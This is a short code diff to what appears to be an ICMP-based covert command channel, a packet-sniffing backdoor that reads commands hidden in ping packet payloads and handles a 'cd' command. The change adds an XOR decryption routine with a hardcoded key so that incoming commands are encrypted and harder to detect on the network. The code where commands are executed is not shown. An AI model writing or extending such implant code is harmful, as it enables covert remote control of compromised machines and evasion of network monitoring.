@@ -10,12 +10,26 @@ import os
 import re
 from time import sleep
 
+key = "ringring"
+
+
+def decrypt(ciphertext):
+    """
+    Decrypt a message encrypted with the XOR cipher with the given key.
+    """
+    global key
+    key_bytes = key.encode()
+    message = bytearray()
+    for i, b in enumerate(bytes.fromhex(ciphertext)):
+        message.append(b ^ key_bytes[i % len(key_bytes)])
+    return message.decode()
+
 
 def sniffHandle(packet: Packet) -> None:
     """Gets called every time a packet from the sniffer is sent, as of right now it prints the payload of the packet"""
     try:
         # packet[3] is the raw layer that contains that data passed into the ping command
-        decodedCommand = packet[3].load.decode()
+        decodedCommand = decrypt(packet[3].load.decode())
         print(decodedCommand)
 
         # checks if the user passed in the cd command
